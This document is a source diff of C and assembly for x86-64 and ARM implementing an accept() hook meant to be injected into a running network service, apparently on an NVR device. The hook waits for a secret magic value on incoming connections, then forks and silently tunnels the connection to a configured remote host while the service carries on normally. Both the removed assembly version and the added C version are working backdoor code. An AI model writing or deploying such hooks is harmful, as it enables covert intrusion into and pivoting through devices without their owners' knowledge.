@@ -1,543 +1,246 @@
 #include "hook/accept_hook.h"
 
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <poll.h>
+#include <sys/time.h>
+#include <stdint.h>
+
+#ifdef __arm__
+#  define HOOK_ATTR __attribute__((section(".text.hook"), noinline, used, target("arm")))
+#else
+#  define HOOK_ATTR __attribute__((section(".text.hook"), noinline, used))
+#endif
+
+typedef int  (*accept_fn_t)      (int, struct sockaddr *, socklen_t *);
+typedef int  (*fork_fn_t)        (void);
+typedef int  (*socket_fn_t)      (int, int, int);
+typedef int  (*connect_fn_t)     (int, const struct sockaddr *, socklen_t);
+typedef int  (*recvfrom_fn_t)    (int, void *, int, int, struct sockaddr *, socklen_t *);
+typedef int  (*sendto_fn_t)      (int, const void *, int, int,
+                                  const struct sockaddr *, socklen_t);
+typedef int  (*poll_fn_t)        (struct pollfd *, unsigned int, int);
+typedef int  (*close_fn_t)       (int);
+typedef void (*exit_fn_t)        (int);
+typedef int  (*getsockname_fn_t) (int, struct sockaddr *, socklen_t *);
+typedef int  (*setsockopt_fn_t)  (int, int, int, const void *, socklen_t);
+
 /* ================================================================== */
-/* x86-64                                                              */
+/* Asm entry — MUST be first in .text.hook so the injected blob starts */
+/* here and the forward bl/call to hook_accept_body is correct.        */
 /* ================================================================== */
+
 #if defined(__x86_64__)
 
-/*
- * Stack frame allocated with sub rsp, 2048:
- *   rsp+0    peek buf       (4 bytes)
- *   rsp+16   sockaddr_in    (16 bytes)
- *   rsp+128  fd_set rfds    (128 bytes; requires fd < 64)
- *   rsp+512  relay buffer   (1400 bytes)
- *
- * Callee-saved register map:
- *   rbx = sockfd (accept arg 0)     r14 = local fd (accept return value)
- *   r12 = addr   (accept arg 1)     r13 = remote fd (child only)
- *   r13 = addrlen (accept arg 2)    r15 = config pointer
- */
 __attribute__((naked, section(".text.hook")))
 void hook_accept(void)
 {
     __asm__ volatile(
-        /* prologue */
-        "push %%rbp\n\t"
+        /* rdi=sockfd  rsi=addr  rdx=addrlen — already set by caller.
+         * rcx = 4th arg = config ptr (patched magic).
+         * push rbx for 16-byte stack alignment (ret addr already pushed). */
         "push %%rbx\n\t"
-        "push %%r12\n\t"
-        "push %%r13\n\t"
-        "push %%r14\n\t"
-        "push %%r15\n\t"
-
-        "movq %%rdi, %%rbx\n\t"
-        "movq %%rsi, %%r12\n\t"
-        "movq %%rdx, %%r13\n\t"
-
-        /* load config pointer — placeholder patched to page+0x400 */
-        "movabs $0xDEADBEEFCAFEBABE, %%r15\n\t"
-
-        /* call real accept() via config->real_accept */
-        "movq 0(%%r15), %%rax\n\t"
-        "movq %%rbx, %%rdi\n\t"
-        "movq %%r12, %%rsi\n\t"
-        "movq %%r13, %%rdx\n\t"
-        "call *%%rax\n\t"
-        "movq %%rax, %%r14\n\t"
-
-        "testq %%r14, %%r14\n\t"
-        "js .Lreturn_fd\n\t"
-
-        "subq $2048, %%rsp\n\t"
-
-        /* recvfrom(fd, rsp, 4, MSG_PEEK|MSG_DONTWAIT=0x42, NULL, NULL) */
-        "movq $45, %%rax\n\t"
-        "movq %%r14, %%rdi\n\t"
-        "movq %%rsp, %%rsi\n\t"
-        "movq $4, %%rdx\n\t"
-        "movq $0x02, %%r10\n\t"     /* MSG_PEEK — block until 4 bytes arrive */
-        "xorq %%r8, %%r8\n\t"
-        "xorq %%r9, %%r9\n\t"
-        "syscall\n\t"
-
-        "cmpq $4, %%rax\n\t"
-        "jne .Lrestore_return_fd\n\t"
-
-        /* compare peeked bytes with config->magic at [r15+0x10] */
-        "movl (%%rsp), %%eax\n\t"
-        "cmpl 0x10(%%r15), %%eax\n\t"
-        "jne .Lrestore_return_fd\n\t"
-
-        /* fork */
-        "movq $57, %%rax\n\t"
-        "syscall\n\t"
-        "testq %%rax, %%rax\n\t"
-        "jnz .Lparent\n\t"
-
-        /* ==== CHILD ==== */
-
-        /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
-        "movq $41, %%rax\n\t"
-        "movq $2,  %%rdi\n\t"
-        "movq $1,  %%rsi\n\t"
-        "xorq %%rdx, %%rdx\n\t"
-        "syscall\n\t"
-        "movq %%rax, %%r13\n\t"
-        "testq %%r13, %%r13\n\t"
-        "js .Lchild_exit\n\t"
-
-        /* build sockaddr_in at rsp+16 */
-        "movq $0, 16(%%rsp)\n\t"
-        "movq $0, 24(%%rsp)\n\t"
-        "movw $2, 16(%%rsp)\n\t"            /* sin_family = AF_INET */
-        "movzwl 0xc(%%r15), %%ecx\n\t"      /* config->remote_port  */
-        "movw %%cx, 18(%%rsp)\n\t"
-        "movl 0x8(%%r15), %%ecx\n\t"        /* config->remote_ip    */
-        "movl %%ecx, 20(%%rsp)\n\t"
-
-        /* connect(remote_fd, &sockaddr_in, 16) */
-        "movq $42, %%rax\n\t"
-        "movq %%r13, %%rdi\n\t"
-        "leaq 16(%%rsp), %%rsi\n\t"
-        "movq $16, %%rdx\n\t"
-        "syscall\n\t"
-        "testq %%rax, %%rax\n\t"
-        "js .Lchild_exit\n\t"
-
-        /* drain the 4 magic bytes that were peeked but not consumed */
-        "movq $45, %%rax\n\t"
-        "movq %%r14, %%rdi\n\t"
-        "movq %%rsp, %%rsi\n\t"
-        "movq $4, %%rdx\n\t"
-        "xorq %%r10, %%r10\n\t"
-        "xorq %%r8, %%r8\n\t"
-        "xorq %%r9, %%r9\n\t"
-        "syscall\n\t"
-
-        /* ==== relay loop: r14=local_fd, r13=remote_fd ==== */
-        ".Lrelay_loop:\n\t"
-
-        /* FD_ZERO 128 bytes at rsp+128 */
-        "movq $0, 128(%%rsp)\n\t"  "movq $0, 136(%%rsp)\n\t"
-        "movq $0, 144(%%rsp)\n\t"  "movq $0, 152(%%rsp)\n\t"
-        "movq $0, 160(%%rsp)\n\t"  "movq $0, 168(%%rsp)\n\t"
-        "movq $0, 176(%%rsp)\n\t"  "movq $0, 184(%%rsp)\n\t"
-        "movq $0, 192(%%rsp)\n\t"  "movq $0, 200(%%rsp)\n\t"
-        "movq $0, 208(%%rsp)\n\t"  "movq $0, 216(%%rsp)\n\t"
-        "movq $0, 224(%%rsp)\n\t"  "movq $0, 232(%%rsp)\n\t"
-        "movq $0, 240(%%rsp)\n\t"  "movq $0, 248(%%rsp)\n\t"
-
-        /* FD_SET(r14) — fd assumed < 64 */
-        "movq $1, %%rax\n\t"
-        "movq %%r14, %%rcx\n\t"
-        "shlq %%cl, %%rax\n\t"
-        "orq  %%rax, 128(%%rsp)\n\t"
-
-        /* FD_SET(r13) */
-        "movq $1, %%rax\n\t"
-        "movq %%r13, %%rcx\n\t"
-        "shlq %%cl, %%rax\n\t"
-        "orq  %%rax, 128(%%rsp)\n\t"
-
-        /* nfds = max(r14, r13) + 1 */
-        "movq %%r14, %%rdi\n\t"
-        "cmpq %%r14, %%r13\n\t"
-        "jle .Luse_r14\n\t"
-        "movq %%r13, %%rdi\n\t"
-        ".Luse_r14:\n\t"
-        "incq %%rdi\n\t"
-
-        /* select(nfds, &rfds, NULL, NULL, NULL) */
-        "movq $23, %%rax\n\t"
-        "leaq 128(%%rsp), %%rsi\n\t"
-        "xorq %%rdx, %%rdx\n\t"
-        "xorq %%r10, %%r10\n\t"
-        "xorq %%r8,  %%r8\n\t"
-        "syscall\n\t"
-        "testq %%rax, %%rax\n\t"
-        "jle .Lrelay_done\n\t"
-
-        /* FD_ISSET(r14) */
-        "movq $1, %%rax\n\t"
-        "movq %%r14, %%rcx\n\t"
-        "shlq %%cl, %%rax\n\t"
-        "movq 128(%%rsp), %%rbx\n\t"
-        "testq %%rax, %%rbx\n\t"
-        "jz .Lcheck_remote\n\t"
-
-        /* recv from local → relay buf at rsp+512 */
-        "movq $45, %%rax\n\t"
-        "movq %%r14, %%rdi\n\t"
-        "leaq 512(%%rsp), %%rsi\n\t"
-        "movq $1400, %%rdx\n\t"
-        "xorq %%r10, %%r10\n\t"
-        "xorq %%r8,  %%r8\n\t"
-        "xorq %%r9,  %%r9\n\t"
-        "syscall\n\t"
-        "testq %%rax, %%rax\n\t"
-        "jle .Lrelay_done\n\t"
-
-        /* send to remote */
-        "movq %%rax, %%rdx\n\t"
-        "movq $44, %%rax\n\t"
-        "movq %%r13, %%rdi\n\t"
-        "leaq 512(%%rsp), %%rsi\n\t"
-        "xorq %%r10, %%r10\n\t"
-        "xorq %%r8,  %%r8\n\t"
-        "xorq %%r9,  %%r9\n\t"
-        "syscall\n\t"
-
-        ".Lcheck_remote:\n\t"
-        /* FD_ISSET(r13) */
-        "movq $1, %%rax\n\t"
-        "movq %%r13, %%rcx\n\t"
-        "shlq %%cl, %%rax\n\t"
-        "movq 128(%%rsp), %%rbx\n\t"
-        "testq %%rax, %%rbx\n\t"
-        "jz .Lrelay_loop\n\t"
-
-        /* recv from remote → relay buf */
-        "movq $45, %%rax\n\t"
-        "movq %%r13, %%rdi\n\t"
-        "leaq 512(%%rsp), %%rsi\n\t"
-        "movq $1400, %%rdx\n\t"
-        "xorq %%r10, %%r10\n\t"
-        "xorq %%r8,  %%r8\n\t"
-        "xorq %%r9,  %%r9\n\t"
-        "syscall\n\t"
-        "testq %%rax, %%rax\n\t"
-        "jle .Lrelay_done\n\t"
-
-        /* send to local */
-        "movq %%rax, %%rdx\n\t"
-        "movq $44, %%rax\n\t"
-        "movq %%r14, %%rdi\n\t"
-        "leaq 512(%%rsp), %%rsi\n\t"
-        "xorq %%r10, %%r10\n\t"
-        "xorq %%r8,  %%r8\n\t"
-        "xorq %%r9,  %%r9\n\t"
-        "syscall\n\t"
-
-        "jmp .Lrelay_loop\n\t"
-
-        ".Lrelay_done:\n\t"
-        "movq $3, %%rax\n\t"            /* SYS_close(local_fd) */
-        "movq %%r14, %%rdi\n\t"
-        "syscall\n\t"
-        "movq $3, %%rax\n\t"            /* SYS_close(remote_fd) */
-        "movq %%r13, %%rdi\n\t"
-        "syscall\n\t"
-
-        ".Lchild_exit:\n\t"
-        "movq $60, %%rax\n\t"           /* SYS_exit(0) */
-        "xorq %%rdi, %%rdi\n\t"
-        "syscall\n\t"
-
-        /* ==== PARENT ==== */
-        ".Lparent:\n\t"
-        "addq $2048, %%rsp\n\t"
-        "movq $3, %%rax\n\t"            /* SYS_close: child owns the fd now */
-        "movq %%r14, %%rdi\n\t"
-        "syscall\n\t"
-        /* re-enter real accept with the original arguments so the next
-         * connection surfaces at this call site rather than returning -1 */
-        "movq 0(%%r15), %%rax\n\t"
-        "movq %%rbx, %%rdi\n\t"
-        "movq %%r12, %%rsi\n\t"
-        "movq %%r13, %%rdx\n\t"
-        "call *%%rax\n\t"
-        "movq %%rax, %%r14\n\t"
-        "jmp .Lreturn_fd\n\t"
-
-        ".Lrestore_return_fd:\n\t"
-        "addq $2048, %%rsp\n\t"
-
-        ".Lreturn_fd:\n\t"
-        "movq %%r14, %%rax\n\t"
-        "pop %%r15\n\t"
-        "pop %%r14\n\t"
-        "pop %%r13\n\t"
-        "pop %%r12\n\t"
+        "movabs $0xDEADBEEFCAFEBABE, %%rcx\n\t"  /* HOOK_CONFIG_MAGIC — patched */
+        "call hook_accept_body\n\t"
         "pop %%rbx\n\t"
-        "pop %%rbp\n\t"
         "ret\n\t"
-
-        ".globl hook_accept_end\n\t"
-        "hook_accept_end:\n\t"
-        :::
-    );
+        ::: );
 }
 
-/* ================================================================== */
-/* ARM 32-bit (ARMv7 / NVR302-32S kernel 3.18)                        */
-/* ================================================================== */
 #elif defined(__arm__)
 
-/*
- * Stack frame allocated with sub sp, sp, #2048:
- *   sp+0    peek buf       (4 bytes)
- *   sp+16   sockaddr_in    (16 bytes)
- *   sp+128  fd_set rfds    (128 bytes; requires fd < 32)
- *   sp+512  relay buffer   (1400 bytes)
- *
- * Registers:
- *   r4=sockfd  r5=addr  r6=addrlen
- *   r9=local_fd  r10=config ptr  r11=remote_fd (child)
- *
- * Syscall numbers (ARM EABI, kernel 3.18):
- *   exit=1  fork=2  close=6  _newselect=142
- *   socket=281  connect=283  sendto=290  recvfrom=292
- */
-#ifdef __arm__
 __attribute__((naked, section(".text.hook"), target("arm")))
-#else
-__attribute__((naked, section(".text.hook")))
-#endif
 void hook_accept(void)
 {
     __asm__ volatile(
         ".arm\n\t"
-        "push {r4-r11, lr}\n\t"
-
-        "mov r4, r0\n\t"
-        "mov r5, r1\n\t"
-        "mov r6, r2\n\t"
-
-        /* load config pointer from literal pool */
-        "ldr r10, .Larm_config_magic\n\t"
-
-        /* call real accept via config->real_accept (low 32 bits at [r10+0]) */
-        "ldr r3, [r10, #0]\n\t"
-        "mov r0, r4\n\t"
-        "mov r1, r5\n\t"
-        "mov r2, r6\n\t"
-        "blx r3\n\t"
-        "mov r9, r0\n\t"
-
-        "cmp r9, #0\n\t"
-        "blt .Larm_return_fd\n\t"
-
-        "sub sp, sp, #2048\n\t"
-
-        /* recvfrom(r9, sp, 4, 0x42, NULL, NULL) */
-        "ldr r7, =292\n\t"
-        "mov r0, r9\n\t"
-        "mov r1, sp\n\t"
-        "mov r2, #4\n\t"
-        "mov r3, #0x02\n\t"         /* MSG_PEEK — block until 4 bytes arrive */
-        "mov r4, #0\n\t"
-        "mov r5, #0\n\t"
-        "svc #0\n\t"
-
-        "cmp r0, #4\n\t"
-        "bne .Larm_restore_return_fd\n\t"
-
-        /* compare peeked bytes with config->magic at [r10+0x10] */
-        "ldr r0, [sp, #0]\n\t"
-        "ldr r1, [r10, #0x10]\n\t"
-        "cmp r0, r1\n\t"
-        "bne .Larm_restore_return_fd\n\t"
-
-        /* fork */
-        "mov r7, #2\n\t"
-        "svc #0\n\t"
-        "cmp r0, #0\n\t"
-        "bne .Larm_parent\n\t"
-
-        /* ==== CHILD ==== */
-
-        /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
-        "ldr r7, =281\n\t"
-        "mov r0, #2\n\t"
-        "mov r1, #1\n\t"
-        "mov r2, #0\n\t"
-        "svc #0\n\t"
-        "mov r11, r0\n\t"
-        "cmp r11, #0\n\t"
-        "blt .Larm_child_exit\n\t"
-
-        /* build sockaddr_in at sp+16 */
-        "mov r0, #0\n\t"
-        "str r0, [sp, #16]\n\t"
-        "str r0, [sp, #20]\n\t"
-        "str r0, [sp, #24]\n\t"
-        "str r0, [sp, #28]\n\t"
-        "mov r0, #2\n\t"
-        "strh r0, [sp, #16]\n\t"       /* sin_family = AF_INET */
-        "ldrh r0, [r10, #0xc]\n\t"     /* config->remote_port  */
-        "strh r0, [sp, #18]\n\t"
-        "ldr  r0, [r10, #0x8]\n\t"     /* config->remote_ip    */
-        "str  r0, [sp, #20]\n\t"
-
-        /* connect(r11, sp+16, 16) */
-        "ldr r7, =283\n\t"
-        "mov r0, r11\n\t"
-        "add r1, sp, #16\n\t"
-        "mov r2, #16\n\t"
-        "svc #0\n\t"
-        "cmp r0, #0\n\t"
-        "blt .Larm_child_exit\n\t"
-
-        /* drain the 4 magic bytes that were peeked but not consumed */
-        "ldr r7, =292\n\t"
-        "mov r0, r9\n\t"
-        "mov r1, sp\n\t"
-        "mov r2, #4\n\t"
-        "mov r3, #0\n\t"
-        "mov r4, #0\n\t"
-        "mov r5, #0\n\t"
-        "svc #0\n\t"
-
-        /* ==== relay loop: r9=local_fd, r11=remote_fd ==== */
-        ".Larm_relay_loop:\n\t"
-
-        /* FD_ZERO 128 bytes at sp+128 */
-        "mov r0, #0\n\t"
-        "add r1, sp, #128\n\t"
-        "mov r2, #32\n\t"
-        ".Larm_fdzero:\n\t"
-        "str r0, [r1], #4\n\t"
-        "subs r2, r2, #1\n\t"
-        "bne .Larm_fdzero\n\t"
-
-        /* FD_SET(r9) — fd assumed < 32 */
-        "mov r0, #1\n\t"
-        "mov r0, r0, lsl r9\n\t"
-        "ldr r1, [sp, #128]\n\t"
-        "orr r1, r1, r0\n\t"
-        "str r1, [sp, #128]\n\t"
-
-        /* FD_SET(r11) */
-        "mov r0, #1\n\t"
-        "mov r0, r0, lsl r11\n\t"
-        "ldr r1, [sp, #128]\n\t"
-        "orr r1, r1, r0\n\t"
-        "str r1, [sp, #128]\n\t"
-
-        /* nfds = max(r9, r11) + 1 */
-        "cmp r9, r11\n\t"
-        "movge r0, r9\n\t"
-        "movlt r0, r11\n\t"
-        "add r0, r0, #1\n\t"
-
-        /* _newselect(nfds, &rfds, NULL, NULL, NULL) */
-        "mov r7, #142\n\t"
-        "add r1, sp, #128\n\t"
-        "mov r2, #0\n\t"
-        "mov r3, #0\n\t"
-        "mov r4, #0\n\t"
-        "svc #0\n\t"
-        "cmp r0, #0\n\t"
-        "ble .Larm_relay_done\n\t"
-
-        /* FD_ISSET(r9) */
-        "mov r0, #1\n\t"
-        "mov r0, r0, lsl r9\n\t"
-        "ldr r1, [sp, #128]\n\t"
-        "tst r1, r0\n\t"
-        "beq .Larm_check_remote\n\t"
-
-        /* recv from local → sp+512 */
-        "ldr r7, =292\n\t"
-        "mov r0, r9\n\t"
-        "add r1, sp, #512\n\t"
-        "ldr r2, =1400\n\t"
-        "mov r3, #0\n\t"
-        "mov r4, #0\n\t"
-        "mov r5, #0\n\t"
-        "svc #0\n\t"
-        "cmp r0, #0\n\t"
-        "ble .Larm_relay_done\n\t"
-
-        /* sendto remote */
-        "mov r6, r0\n\t"
-        "ldr r7, =290\n\t"
-        "mov r0, r11\n\t"
-        "add r1, sp, #512\n\t"
-        "mov r2, r6\n\t"
-        "mov r3, #0\n\t"
-        "mov r4, #0\n\t"
-        "mov r5, #0\n\t"
-        "svc #0\n\t"
-
-        ".Larm_check_remote:\n\t"
-        /* FD_ISSET(r11) */
-        "mov r0, #1\n\t"
-        "mov r0, r0, lsl r11\n\t"
-        "ldr r1, [sp, #128]\n\t"
-        "tst r1, r0\n\t"
-        "beq .Larm_relay_loop\n\t"
-
-        /* recv from remote → sp+512 */
-        "ldr r7, =292\n\t"
-        "mov r0, r11\n\t"
-        "add r1, sp, #512\n\t"
-        "ldr r2, =1400\n\t"
-        "mov r3, #0\n\t"
-        "mov r4, #0\n\t"
-        "mov r5, #0\n\t"
-        "svc #0\n\t"
-        "cmp r0, #0\n\t"
-        "ble .Larm_relay_done\n\t"
-
-        /* sendto local */
-        "mov r6, r0\n\t"
-        "ldr r7, =290\n\t"
-        "mov r0, r9\n\t"
-        "add r1, sp, #512\n\t"
-        "mov r2, r6\n\t"
-        "mov r3, #0\n\t"
-        "mov r4, #0\n\t"
-        "mov r5, #0\n\t"
-        "svc #0\n\t"
-
-        "b .Larm_relay_loop\n\t"
-
-        ".Larm_relay_done:\n\t"
-        "mov r7, #6\n\t"                /* NR_close(local_fd) */
-        "mov r0, r9\n\t"
-        "svc #0\n\t"
-        "mov r7, #6\n\t"                /* NR_close(remote_fd) */
-        "mov r0, r11\n\t"
-        "svc #0\n\t"
-
-        ".Larm_child_exit:\n\t"
-        "mov r7, #1\n\t"                /* NR_exit(0) */
-        "mov r0, #0\n\t"
-        "svc #0\n\t"
-
-        /* ==== PARENT ==== */
-        ".Larm_parent:\n\t"
-        "add sp, sp, #2048\n\t"
-        "mov r7, #6\n\t"                /* NR_close: child owns the fd */
-        "mov r0, r9\n\t"
-        "svc #0\n\t"
-        /* re-enter real accept using original sockfd/addr/addrlen saved on
-         * the stack by the entry push — after add sp,#2048 they are at sp+0/4/8 */
-        "ldr r0, [sp, #0]\n\t"         /* original sockfd (saved r4) */
-        "ldr r1, [sp, #4]\n\t"         /* original addr   (saved r5) */
-        "ldr r2, [sp, #8]\n\t"         /* original addrlen (saved r6) */
-        "ldr r3, [r10, #0]\n\t"        /* config->real_accept */
-        "blx r3\n\t"
-        "mov r9, r0\n\t"
-        "b .Larm_return_fd\n\t"
-
-        ".Larm_restore_return_fd:\n\t"
-        "add sp, sp, #2048\n\t"
-
-        ".Larm_return_fd:\n\t"
-        "mov r0, r9\n\t"
-        "pop {r4-r11, pc}\n\t"
-
+        /* r0=sockfd  r1=addr  r2=addrlen — already set by caller.
+         * r3 = 4th arg = config ptr (patched magic).
+         * push {r4,lr}: r4 is a dummy for 8-byte stack alignment. */
+        "push {r4, lr}\n\t"
+        "ldr r3, .Lconfig_magic\n\t"              /* HOOK_CONFIG_MAGIC — patched */
+        "bl hook_accept_body\n\t"
+        "pop {r4, pc}\n\t"
         ".balign 4\n\t"
-        ".Larm_config_magic: .word 0xDEADBEEF\n\t"  /* HOOK_CONFIG_MAGIC placeholder */
-        ".ltorg\n\t"                    /* flush ldr r, =val literal pool */
-
-        ".globl hook_accept_end\n\t"
-        "hook_accept_end:\n\t"
-        :::
-    );
+        ".Lconfig_magic: .word 0xDEADBEEF\n\t"
+        ".ltorg\n\t"
+        ::: );
 }
 
 #else
 #  error "hook/accept_hook: unsupported architecture"
 #endif
+
+/* ================================================================== */
+/* Debug helper — raw write(2) syscall, no libc needed.               */
+/* ================================================================== */
+
+#ifdef DEBUG_HOOK
+/* Write a single char to fd 2 using the raw write syscall.
+ * Stores the char on the stack — no .rodata reference, safe in injected blob. */
+# if defined(__x86_64__)
+HOOK_ATTR
+static void dbg_char(char c) {
+    char buf[2]; buf[0] = c; buf[1] = '\n';
+    __asm__ volatile("syscall"
+        : : "a"(1L), "D"(2L), "S"(buf), "d"(2L) : "rcx", "r11", "memory");
+}
+# elif defined(__arm__)
+HOOK_ATTR
+static void dbg_char(char c) {
+    char buf[2]; buf[0] = c; buf[1] = '\n';
+    register int        r0 __asm__("r0") = 2;
+    register const char *r1 __asm__("r1") = buf;
+    register int        r2 __asm__("r2") = 2;
+    register int        r7 __asm__("r7") = 4;
+    __asm__ volatile("swi #0" : "+r"(r0) : "r"(r1), "r"(r2), "r"(r7) : "memory");
+}
+# endif
+# define DBG(c) dbg_char(c)
+#else
+# define DBG(c) ((void)0)
+#endif
+
+/* ================================================================== */
+/* C body — comes after the entry so the blob copy includes both.     */
+/* All libc calls go through cfg->fn_* — zero external references.   */
+/* ================================================================== */
+
+HOOK_ATTR
+static int hook_accept_body(int sockfd, struct sockaddr *addr, socklen_t *addrlen,
+                             struct hook_config *cfg)
+{
+    accept_fn_t      real_accept    = (accept_fn_t)     (uintptr_t)cfg->real_accept;
+    fork_fn_t        do_fork        = (fork_fn_t)        (uintptr_t)cfg->fn_fork;
+    socket_fn_t      do_socket      = (socket_fn_t)      (uintptr_t)cfg->fn_socket;
+    connect_fn_t     do_connect     = (connect_fn_t)     (uintptr_t)cfg->fn_connect;
+    recvfrom_fn_t    do_recvfrom    = (recvfrom_fn_t)    (uintptr_t)cfg->fn_recvfrom;
+    sendto_fn_t      do_sendto      = (sendto_fn_t)      (uintptr_t)cfg->fn_sendto;
+    poll_fn_t        do_poll        = (poll_fn_t)        (uintptr_t)cfg->fn_poll;
+    close_fn_t       do_close       = (close_fn_t)       (uintptr_t)cfg->fn_close;
+    exit_fn_t        do_exit        = (exit_fn_t)        (uintptr_t)cfg->fn_exit;
+    getsockname_fn_t do_getsockname = (getsockname_fn_t) (uintptr_t)cfg->fn_getsockname;
+    setsockopt_fn_t  do_setsockopt  = (setsockopt_fn_t)  (uintptr_t)cfg->fn_setsockopt;
+
+    /* A=entering, a=accepted, P=port-ok, p=port-mismatch, T=setsockopt,
+     * K=peek-ok, k=peek-short, M=magic-ok, m=magic-mismatch,
+     * !!=fork-failed, F=fork-parent, C=fork-child,
+     * S=socket-ok, s=socket-fail, N=connect-ok, n=connect-fail, R=relay */
+    DBG('A');
+    int local_fd = real_accept(sockfd, addr, addrlen);
+    if (local_fd < 0)
+        return local_fd;
+    DBG('a');
+
+    /* port scoping: only intercept connections on the configured local port */
+    if (cfg->local_port) {
+        struct sockaddr_in sin;
+        socklen_t slen = sizeof(sin);
+        if (do_getsockname(local_fd, (struct sockaddr *)&sin, &slen) == 0)
+            if (sin.sin_port != cfg->local_port) {
+                DBG('p');
+                return local_fd;
+            }
+    }
+    DBG('P');
+
+    /* 1s recv timeout so MSG_PEEK never blocks forever on idle connections */
+    struct timeval tv;
+    tv.tv_sec  = 1;
+    tv.tv_usec = 0;
+    do_setsockopt(local_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    DBG('T');
+
+    /* peek 8 bytes: 4-byte NVR preamble + 4-byte magic */
+    uint8_t peek[8];
+    if (do_recvfrom(local_fd, peek, 8, MSG_PEEK, 0, 0) != 8) {
+        DBG('k');
+        return local_fd;
+    }
+    DBG('K');
+
+    /* compare bytes [4..7] against config magic */
+    uint32_t got_magic, cfg_magic;
+    __builtin_memcpy(&got_magic, peek + 4, 4);
+    __builtin_memcpy(&cfg_magic, cfg->magic, 4);
+    if (got_magic != cfg_magic) {
+        DBG('m');
+        return local_fd;
+    }
+    DBG('M');
+
+    int pid = do_fork();
+    if (pid < 0) {
+        DBG('!');
+        return local_fd;
+    }
+
+    if (pid != 0) {
+        DBG('F');
+        do_close(local_fd);
+        return real_accept(sockfd, addr, addrlen);
+    }
+
+    /* child: establish the tunnel */
+    DBG('C');
+    int remote_fd = do_socket(AF_INET, SOCK_STREAM, 0);
+    if (remote_fd < 0) {
+        DBG('s');
+        goto child_exit;
+    }
+    DBG('S');
+
+    struct sockaddr_in remote;
+    remote.sin_family      = AF_INET;
+    remote.sin_port        = cfg->remote_port;
+    remote.sin_addr.s_addr = cfg->remote_ip;
+
+    if (do_connect(remote_fd, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
+        DBG('n');
+        goto child_exit;
+    }
+    DBG('N');
+    DBG('R');
+
+    /* consume the 8 peeked bytes (preamble + magic) */
+    do_recvfrom(local_fd, peek, 8, 0, 0, 0);
+
+    /* relay loop — poll() has no fd-number limit unlike select() */
+    for (;;) {
+        struct pollfd fds[2];
+        fds[0].fd = local_fd;  fds[0].events = POLLIN; fds[0].revents = 0;
+        fds[1].fd = remote_fd; fds[1].events = POLLIN; fds[1].revents = 0;
+
+        if (do_poll(fds, 2, -1) <= 0)
+            break;
+
+        uint8_t buf[1400];
+
+        if (fds[0].revents & POLLIN) {
+            int r = do_recvfrom(local_fd, buf, sizeof(buf), 0, 0, 0);
+            if (r <= 0) break;
+            do_sendto(remote_fd, buf, r, 0, 0, 0);
+        }
+        if (fds[1].revents & POLLIN) {
+            int r = do_recvfrom(remote_fd, buf, sizeof(buf), 0, 0, 0);
+            if (r <= 0) break;
+            do_sendto(local_fd, buf, r, 0, 0, 0);
+        }
+    }
+
+child_exit:
+    do_close(local_fd);
+    do_close(remote_fd);
+    do_exit(0);
+    __builtin_unreachable();
+}
+
+/* ================================================================== */
+/* End-of-blob marker — must be last in .text.hook.                   */
+/* ================================================================== */
+__asm__(
+    ".section .text.hook, \"ax\"\n\t"
+    ".globl hook_blob_end\n\t"
+    "hook_blob_end:\n\t"
+    ".previous\n\t"
+);
